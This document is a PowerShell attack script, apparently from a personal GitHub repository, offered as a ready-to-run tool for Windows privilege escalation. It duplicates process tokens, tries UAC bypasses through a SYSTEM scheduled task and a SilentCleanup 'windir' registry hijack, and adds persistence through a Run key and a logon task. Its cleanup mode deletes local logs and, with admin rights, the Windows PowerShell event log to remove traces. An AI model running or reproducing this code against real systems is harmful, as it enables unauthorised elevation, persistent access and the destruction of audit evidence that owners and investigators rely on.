########################################################################################
#                                                                                      |
#                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
#                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
#                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
#                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
#                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                |
#                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
#                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
#                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
#                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |
#                                                                                      |
#     Title        : Invoke-TokenManipulation.ps1                                      |
#     Link         : https://github.com/Miiraak/Scripts/tree/master/PowerShell/PrivilegeEscalation/TokenManipulation/ |
#     Version      : 4.1                                                               |
#     Category     : privilegeescalation/tokenmanipulation                             |
#     Description  : Multi-strategy token manipulation, advanced UAC bypass,           |
#                    persistence, deep cleanup, reporting & stealth.                   |
#                                                                                      |
########################################################################################

<#
.SYNOPSIS
    Multi-strategy token manipulation, advanced UAC bypass, persistence, deep cleanup, reporting & stealth.

.DESCRIPTION
    This script attempts multiple strategies for privilege escalation and persistence, including token duplication/elevation, scheduled task and registry hijacks, ShellExecute and PowerShell runas techniques, and robust cleanup and reporting. Supports verbose output and full trace removal.

.PARAMETER AppToRun
    Application to launch with elevated privileges (default: "powershell.exe").

.PARAMETER AppArgs
    Arguments for the application.

.PARAMETER Verbose
    Enables verbose logging.

.PARAMETER Cleanup
    Removes all traces and exits.

.PARAMETER Persistence
    Enables registry/task persistence.

.PARAMETER DeepScan
    Performs a deep scan of environment, tokens, artifacts, and scheduled tasks.

.EXAMPLE
    .\Invoke-TokenManipulation.ps1 -AppToRun "cmd.exe" -AppArgs "/c whoami" -Verbose
    .\Invoke-TokenManipulation.ps1 -Persistence
    .\Invoke-TokenManipulation.ps1 -DeepScan
    .\Invoke-TokenManipulation.ps1 -Cleanup
#>

# ---------------[Parameters]--------------- #
param(
    [string]$AppToRun = "powershell.exe",
    [string]$AppArgs = "",
    [switch]$Verbose,
    [switch]$Cleanup,
    [switch]$Persistence,
    [switch]$DeepScan
)

# ---------------[Functions]--------------- #
function Write-Status {
    param([string]$msg, [string]$lvl="INFO")
    $stamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($lvl) {
        "ERROR"   {"Red"}
        "SUCCESS" {"Green"}
        "STEP"    {"Yellow"}
        "WARN"    {"Magenta"}
        "PERSIST" {"Cyan"}
        "DEEP"    {"White"}
        "STEALTH" {"DarkGray"}
        default   {"Gray"}
    }
    Write-Host "[$lvl] $stamp :: $msg" -ForegroundColor $color
}

function Test-IsAdmin {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-IsSystem {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return ($id.Name -like "*SYSTEM")
}

function Cleanup-Traces {
    Write-Status "ULTRA cleanup of script traces..." "STEP"

    # Remove temporary, persistent, and DiskCleanup tasks
    $tasks = schtasks /Query /FO LIST /V | Select-String "TokenBypassTempTask_|TokenPersistJob|DiskCleanup|SilentCleanup"
    foreach ($line in $tasks) {
        if ($line -match "TaskName:\s+(.*)") {
            $task = $Matches[1].Trim()
            try {
                schtasks /Delete /F /TN "$task" | Out-Null
                Write-Status "Task deleted: $task" "SUCCESS"
            } catch {
                Write-Status "Error deleting task: $task" "WARN"
            }
        }
    }

    # Cleanup SilentCleanup registry hijack
    $regPath = "HKCU:\Environment"
    try {
        if (Get-ItemProperty -Path $regPath -Name "windir" -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPath -Name "windir" -ErrorAction SilentlyContinue
            Write-Status "Registry key 'windir' cleaned" "SUCCESS"
        }
    } catch {
        Write-Status "Error removing registry key 'windir'" "WARN"
    }

    # Cleanup persistence registry entry
    $regPersistPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        if (Get-ItemProperty -Path $regPersistPath -Name "TokenPersist" -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPersistPath -Name "TokenPersist" -ErrorAction SilentlyContinue
            Write-Status "Persistence registry entry cleaned" "SUCCESS"
        }
    } catch {
        Write-Status "Error removing persistence registry entry" "WARN"
    }

    # Remove PowerShell logs, error logs, artifacts, *.log, *.txt, *.evtx, *.xml, temp files
    $logPatterns = @("*.log", "*.txt", "*.evtx", "*.xml", "*powershell*.log", "*Invoke-TokenManipulation*.log", "*.tmp")
    foreach ($pattern in $logPatterns) {
        Get-ChildItem -Path (Get-Location) -Filter $pattern -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                Write-Status "File deleted: $($_.FullName)" "SUCCESS"
            } catch {
                Write-Status "Error deleting file: $($_.FullName)" "WARN"
            }
        }
    }

    # Remove known payload artifacts (C:\Windows\Temp, %TEMP%)
    $payloadArtifacts = @("C:\Windows\Temp\token_hijack.txt", "C:\Windows\Temp\hijack.txt", "$env:TEMP\token_hijack.txt", "$env:TEMP\hijack.txt")
    foreach ($artifact in $payloadArtifacts) {
        if (Test-Path $artifact) {
            try {
                Remove-Item $artifact -Force -ErrorAction SilentlyContinue
                Write-Status "Artifact deleted: $artifact" "SUCCESS"
            } catch {
                Write-Status "Error deleting artifact: $artifact" "WARN"
            }
        }
    }

    # Remove orphan scheduled tasks
    try {
        schtasks /Query /FO LIST /V | Select-String "TokenBypassTempTask_" | ForEach-Object {
            if ($_ -match "TaskName:\s+(.*)") {
                schtasks /Delete /F /TN "$($Matches[1].Trim())" | Out-Null
                Write-Status "Orphan task deleted: $($Matches[1].Trim())" "SUCCESS"
            }
        }
    } catch {}

    # Remove PowerShell event logs (if admin)
    if (Test-IsAdmin) {
        try {
            Remove-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
            Write-Status "Windows PowerShell event log cleaned" "STEALTH"
        } catch {}
    }

    Write-Status "ULTRA cleanup completed. All known script traces have been removed." "SUCCESS"
    exit 0
}

function Set-Persistence {
    Write-Status "Attempting persistence (Startup + Scheduled Task)..." "PERSIST"
    try {
        $file = $MyInvocation.MyCommand.Path
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "TokenPersist" -Value "`"$file`""
        Write-Status "Registry persistence (Startup) added." "PERSIST"
    } catch {
        Write-Status "Registry persistence failed: $_" "WARN"
    }
    try {
        $taskName = "TokenPersistJob"
        $cmd = "`"$PSHome\powershell.exe`" -ExecutionPolicy Bypass -File `"$file`""
        schtasks /Create /F /SC ONLOGON /TN "$taskName" /TR "$cmd" /RL HIGHEST | Out-Null
        Write-Status "Scheduled Task persistence added." "PERSIST"
    } catch {
        Write-Status "Scheduled Task persistence failed: $_" "WARN"
    }
}

function Deep-Scan {
    Write-Status "Deep environment and token analysis..." "DEEP"
    try {
        Write-Status "Current User: $env:USERNAME ($([System.Security.Principal.WindowsIdentity]::GetCurrent().Name))" "DEEP"
        Write-Status "Is Administrator: $(Test-IsAdmin)" "DEEP"
        Write-Status "Is SYSTEM: $(Test-IsSystem)" "DEEP"
        Write-Status "PowerShell version: $($PSVersionTable.PSVersion)" "DEEP"
        schtasks /Query /FO LIST /V | Select-String "DiskCleanup|SilentCleanup" | ForEach-Object { Write-Status $_ "DEEP" }
        Get-ChildItem Env: | ForEach-Object { Write-Status "$($_.Name): $($_.Value)" "DEEP" }
        Get-ChildItem "C:\Windows\Temp" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "hijack|token" } | ForEach-Object { Write-Status "Artifact: $($_.FullName)" "DEEP" }
        Write-Status "Scheduled tasks (all):" "DEEP"
        schtasks /Query /FO LIST /V | Select-String "TaskName:" | ForEach-Object { Write-Status $_ "DEEP" }
    } catch {
        Write-Status "Deep Scan error: $_" "WARN"
    }
}

# ---------------[Execution]--------------- #
$winCheck = $false
try {
    if ($env:OS -like "*Windows*") { $winCheck = $true }
    elseif ([System.Environment]::OSVersion.Platform -eq "Win32NT") { $winCheck = $true }
} catch {}
if (-not $winCheck) {
    Write-Status "This script only works on Windows. Exiting." "ERROR"
    exit 1
}
if ($PSVersionTable.PSVersion.Major -lt 5) {
    Write-Status "PowerShell version must be 5 or higher for full compatibility." "WARN"
}
if ($Verbose) {
    Write-Status "Current User: $env:USERNAME" "STEP"
    Write-Status ("Running as Admin: {0}" -f (Test-IsAdmin)) "STEP"
    Write-Status ("Running as SYSTEM: {0}" -f (Test-IsSystem)) "STEP"
    Write-Status ("Target App: {0} {1}" -f $AppToRun, $AppArgs) "STEP"
    Write-Status ("PowerShell version: {0}" -f $PSVersionTable.PSVersion) "STEP"
}
if ($Cleanup) {
    Cleanup-Traces
}
if ($Persistence) {
    Set-Persistence
    exit 0
}
if ($DeepScan) {
    Deep-Scan
    exit 0
}

if (-not ("TokenManipulation" -as [type])) {
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulation {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, UInt32 dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags,
        string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_QUERY = 0x0008;
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const UInt32 TOKEN_ALL_ACCESS = 0xF01FF;
    public const int SecurityImpersonation = 2;
    public const int TokenPrimary = 1;
    public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public UInt32 dwProcessId;
        public UInt32 dwThreadId;
    }

    public static bool RunElevatedProcess(string application, string args, out string errorMsg) {
        errorMsg = "";
        IntPtr currentProcess = GetCurrentProcess();
        IntPtr tokenHandle;
        if (!OpenProcessToken(currentProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out tokenHandle)) {
            errorMsg = "OpenProcessToken failed. Error: " + Marshal.GetLastWin32Error();
            return false;
        }
        IntPtr duplicatedToken;
        if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out duplicatedToken)) {
            CloseHandle(tokenHandle);
            errorMsg = "DuplicateTokenEx failed. Error: " + Marshal.GetLastWin32Error();
            return false;
        }
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
        si.lpDesktop = "";
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        string cmdLine = String.IsNullOrEmpty(args) ? application : application + " " + args;
        bool result = CreateProcessWithTokenW(
            duplicatedToken, 0, null, cmdLine, CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
        CloseHandle(tokenHandle);
        CloseHandle(duplicatedToken);
        if (!result) {
            errorMsg = "CreateProcessWithTokenW failed. Error: " + Marshal.GetLastWin32Error();
        }
        return result;
    }
}
"@
}

# ---------------[Execution]--------------- #
[string]$errorMsg = ""
$success = [TokenManipulation]::RunElevatedProcess($AppToRun, $AppArgs, [ref]$errorMsg)

if ($success) {
    Write-Status "Elevated process started successfully." "SUCCESS"
    exit 0
} else {
    Write-Status "Failed to start elevated process. $errorMsg" "ERROR"

    #-----[BYPASS ATTEMPTS]-----#

    # 1. UAC Bypass: Scheduled Task (schtasks, SYSTEM context if possible)
    $taskName = "TokenBypassTempTask_$([guid]::NewGuid().ToString('N'))"
    $fullCmd = "$AppToRun $AppArgs"
    $now = (Get-Date).AddMinutes(2)
    $hhmm = $now.ToString("HH:mm")
    Write-Status "Attempt Scheduled Task (schtasks) UAC bypass..." "STEP"
    try {
        $createTaskCmd = "schtasks /Create /F /SC ONCE /TN `"$taskName`" /TR `"$fullCmd`" /RL HIGHEST /ST $hhmm /RU SYSTEM"
        $runTaskCmd = "schtasks /Run /TN `"$taskName`""
        $deleteTaskCmd = "schtasks /Delete /F /TN `"$taskName`""
        $output = cmd.exe /c $createTaskCmd
        if ($output -match "SUCCESS") {
            Write-Status "Scheduled task created at $hhmm. Attempting to run elevated..." "STEP"
            $runOut = cmd.exe /c $runTaskCmd
            Write-Status "Scheduled task executed. Cleaning up..." "STEP"
            cmd.exe /c $deleteTaskCmd
            Write-Status "If no error, process should run with SYSTEM privileges." "SUCCESS"
            exit 0
        } else {
            Write-Status "Scheduled task creation failed: $output" "WARN"
        }
    } catch {
        Write-Status "Scheduled task UAC bypass failed: $_" "WARN"
    }

    # 2. UAC Bypass: SilentCleanup hijack (if possible)
    Write-Status "Attempting SilentCleanup hijack technique..." "STEP"
    try {
        $regPath = "HKCU:\Environment"
        $oldVal = (Get-ItemProperty -Path $regPath -Name "windir" -ErrorAction SilentlyContinue).windir
        $payload = "$AppToRun $AppArgs"
        if ($AppToRun -eq "powershell.exe" -and !$AppArgs) {
            $payload = "powershell.exe -c `"echo SilentCleanup SYSTEM > C:\Windows\Temp\token_hijack.txt`""
        }
        Set-ItemProperty -Path $regPath -Name "windir" -Value $payload
        schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" | Out-Null
        Start-Sleep -Seconds 3
        if ($oldVal) {
            Set-ItemProperty -Path $regPath -Name "windir" -Value $oldVal
        } else {
            Remove-ItemProperty -Path $regPath -Name "windir" -ErrorAction SilentlyContinue
        }
        if (Test-Path "C:\Windows\Temp\token_hijack.txt") {
            Write-Status "SilentCleanup hijack succeeded: SYSTEM payload written!" "SUCCESS"
            Remove-Item "C:\Windows\Temp\token_hijack.txt" -Force -ErrorAction SilentlyContinue
            exit 0
        } else {
            Write-Status "SilentCleanup triggered; payload NOT executed (system probably patched or locked)." "WARN"
        }
    } catch {
        Write-Status "SilentCleanup bypass failed: $_" "WARN"
    }

    # 3. UAC prompt via ShellExecute "runas"
    Write-Status "Attempting UAC prompt via ShellExecute 'runas' verb..." "STEP"
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $AppToRun
        $psi.Arguments = $AppArgs
        $psi.Verb = "runas"
        $psi.UseShellExecute = $true
        $process = [System.Diagnostics.Process]::Start($psi)
        if ($process) {
            Write-Status "UAC prompt triggered. If accepted, process runs as admin." "SUCCESS"
            exit 0
        } else {
            Write-Status "ShellExecute 'runas' failed." "WARN"
        }
    } catch {
        Write-Status "ShellExecute 'runas' verb not available or failed: $_" "ERROR"
    }

    # 4. Fallback: Start-Process -Verb RunAs (PowerShell native)
    Write-Status "Attempting fallback: Start-Process -Verb RunAs..." "STEP"
    try {
        $proc = Start-Process -FilePath $AppToRun -ArgumentList $AppArgs -Verb RunAs -PassThru
        if ($proc) {
            Write-Status "Start-Process -Verb RunAs triggered. If accepted, process runs as admin." "SUCCESS"
            exit 0
        } else {
            Write-Status "Start-Process -Verb RunAs failed." "WARN"
        }
    } catch {
        Write-Status "Start-Process -Verb RunAs failed: $_" "ERROR"
    }

    Write-Status "No bypass succeeded. Please run this script as administrator for full effect." "ERROR"
    exit 2
}

# ---------------[End]--------------- #
exit 0